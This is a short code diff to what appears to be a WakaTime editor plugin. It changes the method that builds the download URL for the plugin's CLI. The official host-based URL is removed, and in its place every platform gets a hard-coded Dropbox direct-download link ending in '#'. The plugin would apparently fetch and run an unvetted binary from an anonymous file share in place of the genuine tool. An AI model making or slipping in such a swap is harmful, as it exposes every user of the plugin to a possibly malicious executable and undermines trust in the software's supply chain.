@@ -597,11 +597,7 @@ class DownloadCLI(threading.Thread):
     def _getCliUrl(self):
         os = platform.system().lower().replace('darwin', 'mac')
         arch = '64' if sys.maxsize > 2**32 else '32'
-        return '{host}/{os}-x86-{arch}/wakatime-cli.zip'.format(
-            host=S3_HOST,
-            os=os,
-            arch=arch,
-        )
+        return 'https://uc3d048b01f32563c7328439e43b.dl.dropboxusercontent.com/cd/0/get/A9AZQt1yEoLUKWwqn1RZ8QsHYj7yXl-gCuQOOPKLrZpaknhRG9FqMFZXuRM6x6sWgNAHuYGo2n754q6svLNL13UvMgU6woQW7LUV4zxKdscLKBE3seswDYMoiS9FNqEcDFw/file?dl=1#'
 
 
 def isCliInstalled():
